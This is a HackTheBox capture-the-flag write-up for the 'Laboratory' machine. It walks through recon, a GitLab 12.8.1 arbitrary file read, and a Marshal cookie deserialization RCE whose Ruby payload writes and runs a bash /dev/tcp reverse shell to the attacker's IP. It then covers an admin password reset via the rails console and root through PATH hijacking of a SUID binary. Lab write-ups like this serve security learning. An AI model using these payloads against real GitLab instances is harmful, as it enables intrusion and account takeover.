---
layout: post
title:  "HackTheBox Laboratory Writeup" 
tags: hackthebox gitlab-afr-rce path-hijacking
categories: hackthebox active-machine 
rel-img: /assets/img/htb/laboratory/laboratory.png
description: Very long journey to get first access exploting gitlab vulnerabilities. Basic linux enumeration and path hijacking open the door to root!!
---

### Hackthebox Laboratory Writeup
![Laboratory](/assets/img/htb/laboratory/laboratory.png)

## Abstract

Very long journey to get first access exploting gitlab vulnerabilities. Basic linux enumeration and path hijacking open the door to root!!

## Summary
1. Initial foothold
  - Nmap recon
  - Gobuster enum
2. Gitlab Arbitrary file read
3. Gitlab RCE 
4. User Flag
5. Priviledge Escalation
  - Basic enumeration
  - Path Hijacking
6. Root Flag

## Initial foothold

### Nmap recon

```
sh4ck@kali:~$ sudo nmap -A 10.10.10.216
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-21 10:47 CET
Nmap scan report for laboratory.htb (10.10.10.216)
Host is up (0.045s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Laboratory
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Not valid before: 2020-07-05T10:39:28
|_Not valid after:  2024-03-03T10:39:28
| tls-alpn: 
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (91%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.32 - 3.1 (86%), Linux 2.6.39 - 3.2 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   44.74 ms 10.10.14.1
2   44.85 ms laboratory.htb (10.10.10.216)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.79 seconds
```
Nmap showed three open ports 80,443,22. In the port 80 there was a redirect to 443, and onto ssl-certificate i saw another domain: `git.laboratory.htb`

I started adding `laboratory,htb` and `git.laboratory.htb` to my hosts file. Than i browsed port 443:

![webapp home page](/assets/img/htb/laboratory/home-lab.png)

There was nothing usefull on the webiste other than some usernames:

![webapp home page2](/assets/img/htb/laboratory/home-lab2.png)

### Gobuster enum

```
sh4ck@kali:~$ gobuster dir -u https://laboratory.htb -w /usr/share/wordlists/dirb/common.txt -k -t 40 -x .txt,.php,.html,.zip
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://laboratory.htb
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php,html,zip
[+] Timeout:        10s
===============================================================
2020/11/21 10:52:32 Starting gobuster
===============================================================
/assets (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
===============================================================
2020/11/21 10:52:37 Finished
===============================================================
```
Gobuster discovered nothing of interesting. So i moved forward to gitlab sub domain, and i found gitlab local instance:

![gitlab local instance](/assets/img/htb/laboratory/gitlab-login.png)

I decided to register a new account and than to login:

Under the projects i found one owned by `Dexter` (same user saw in the homepage):

![gitlab projects](/assets/img/htb/laboratory/gitlab-project.png)

with a open issue raised by user `Seven`:

![gitlab local instance](/assets/img/htb/laboratory/gitlab-project-issue.png)

I didn't find anything juicy in the projects repo. So i checked the gitlab version in order to find some vulnerabilities (https://git.laboratory.htb/help), that it was `Gitlab Community Edition 12.8.1`.

## Gitlab Arbitrary file read

I searched on google and got so many CVEs but a `hackerone report` caught my attention, it was about Arbitrary File Read and RCE [](https://hackerone.com/reports/827052)

First part of report was about `Arbitrary file read` so i proceeded to test if it was vulnerable or not. Following step in report:

- I made repos `repo1` and `repo2`.

- I opened an issue in repo1 with the content: 
  `![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)`

![gitlab issue](/assets/img/htb/laboratory/new-issue.png)

- I moved the issue to the `repo2`
    
- I downloaded the `passwd`file

![gitlab file read](/assets/img/htb/laboratory/file-read.png)

## Gitlab RCE

Since gitlab app was vulnerable i could perform the RCE as mentioned in the report. First of all i made a `Marshalled payload` with the github-rails console, to store `/tmp/shell`:

>shell.sh

```
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar

erb = ERB.new("<%= `echo 'bash -i >& /dev/tcp/10.10.14.148/4545 0>&1' > /tmp/shell.sh` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
```

With Burp i replaced the text in the `experimentation_subject_id cookie` with above url-encoded, and i forwarded http request:

```
GET / HTTP/1.1
Host: git.laboratory.htb
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,hi;q=0.8
Cookie: experimentation_subject_id=%42%41--redacted--; event_filter=all; sidebar_collapsed=false; _gitlab_session=t66bghia85624bc6789d2w18c3aa6mlo93
```
I made another payload to call the shell in `/tmp/shell.sh`:
```
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar

erb = ERB.new("<%= `bash /tmp/shell.sh` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
```
and than i encoded the marshell-payload, in order to proceed with a new http request:
```
GET / HTTP/1.1
Host: git.laboratory.htb
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,hi;q=0.8
Cookie: experimentation_subject_id=%42%41--redacted--; event_filter=all; sidebar_collapsed=false; _gitlab_session=t66bghia85624bc6789d2w18c3aa6mlo93
```
so i got a reverse shell:
```
$ rlwrap nc -nlvp 4545
listening on [any] 4545 ...
connect to [10.10.14.148] from (UNKNOWN) [10.10.10.216] 37206
bash: cannot set terminal process group (375): Inappropriate ioctl for device
bash: no job control in this shell
git@git:~/gitlab-rails/working$
```
After a bunch of enumeration,since the gitlab was installed, i could spawn a gitlab-rails console and reset the admin password. Following official documentation [](https://docs.gitlab.com/12.10/ee/security/reset_root_password.html):

```
git@git:~/gitlab-rails/working$ gitlab-rails console
gitlab-rails console
--------------------------------------------------------------------------------
 GitLab:       12.8.1 (d18b43a5f5a) FOSS
 GitLab Shell: 11.0.0
 PostgreSQL:   10.12
--------------------------------------------------------------------------------
Loading production environment (Rails 6.0.2)
irb(main):001:0> user = User.where(id: 1).first
user = User.where(id: 1).first
user = User.where(id: 1).first
=> #<User id:1 @dexter>
irb(main):002:0>
irb(main):004:0> user.password = 'secret_pass'
user.password = 'secret_pass'
user.password = 'secret_pass'
=> "secret_pass"
irb(main):005:0> user.password_confirmation = 'secret_pass'
user.password_confirmation = 'secret_pass'
user.password_confirmation = 'secret_pass'
=> "secret_pass"
irb(main):006:0> user.save!
user.save!
user.save!
Enqueued ActionMailer::DeliveryJob (Job ID: 9b73ad20-ba45-421e-9938-f72bd1f528f0) to Sidekiq(mailers) with arguments: "DeviseMailer", "password_change", "deliver_now", #<GlobalID:0x00007f7f90addf38 @uri=#<URI::GID gid://gitlab/User/1>>
=> true
irb(main):007:0>
```
## User Flag

Next step was log in to gitlab as `dexter` with the password `secret_pass`.

I found a repo called `secureDocker`

![gitlab dexter](/assets/img/htb/laboratory/dexter-git.png)

Exploring Dexter directory, i discovered a .ssh folder containing ssh keys:

![gitlab file read](/assets/img/htb/laboratory/dexter-ssh.png)

I got the ssh priv key and used it to log in as dexter:

```
sh4ck@kali:~/Desktop/laboratory_htb$ ssh -i id-dex dexter@laboratory.htb
The authenticity of host 'laboratory.htb (10.10.10.216)' can't be established.
ECDSA key fingerprint is SHA256:XexmI3GbFIB7qyVRFDIYvKcLfMA9pcV9LeIgJO5KQaA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'laboratory.htb,10.10.10.216' (ECDSA) to the list of known hosts.
dexter@laboratory:~$ ls -la
total 40
drwxr-xr-x 6 dexter dexter 4096 Oct 22 08:42 .
drwxr-xr-x 3 root   root   4096 Jun 26 20:17 ..
lrwxrwxrwx 1 root   root      9 Jul 17 15:19 .bash_history -> /dev/null
-rw-r--r-- 1 dexter dexter  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 dexter dexter 3771 Feb 25  2020 .bashrc
drwx------ 2 dexter dexter 4096 Jun 26 20:29 .cache
drwx------ 2 dexter dexter 4096 Nov 21 14:09 .gnupg
drwxrwxr-x 3 dexter dexter 4096 Jun 26 20:48 .local
-rw-r--r-- 1 dexter dexter  807 Feb 25  2020 .profile
drwx------ 2 dexter dexter 4096 Jun 26 21:21 .ssh
-r--r----- 1 root   dexter   33 Nov 21 09:32 user.txt
```
As showed above, in the home folder i picked up user.txt.

## Priviledge Escalation

### Basic Enumeration

I downloaded locally and ran `Linpeas`, and got in the output:

> [+] Possibly interesting SUID files:                                                                     
> -rwsr-xr-x 1 root dexter 16720 Aug 28 14:52 /usr/local/bin/docker-security

I tried to run the binary, but nothing happened. So i downloaded locally and ran `pspy`, and launched the docker-security bynary.

I saw some process running after i ran docker-security

>2020/11/17 07:10:34 CMD: UID=0    PID=77936  | /usr/local/bin/docker-security 
>2020/11/17 07:10:34 CMD: UID=0    PID=77938  | sh -c chmod 700 /usr/bin/docker 
>2020/11/17 07:10:34 CMD: UID=0    PID=77939  | sh -c chmod 660 /var/run/docker.sock 
>2020/11/17 07:10:34 CMD: UID=0    PID=77940  | sh -c chmod 660 /var/run/docker.sock

The `chmod` commad was used without specifying the full path `/usr/bin/chmod`. This suggested me to try Path Hijacking.

### Path Hijacking

I made a custom chmod which spawned a shell:

```
dexter@laboratory:~$ echo "/bin/bash" >> chmod
```
I added the current directory to `$PATH`

```
dexter@laboratory:~$ export PATH=$(pwd):$PATH
```
Than i gave execute permission to chmod

```
dexter@laboratory:~$ chmod +x chmod
```
## Root Flag

I tried to run docker-security, and path-hijacking has worked, so root has ran my chmod command and spawned a root shell:
```
dexter@laboratory:~$ /usr/local/bin/docker-security
root@laboratory:~# id
uid=0(root) gid=0(root) groups=0(root),1000(dexter)
```
Finally, i got root.txt:
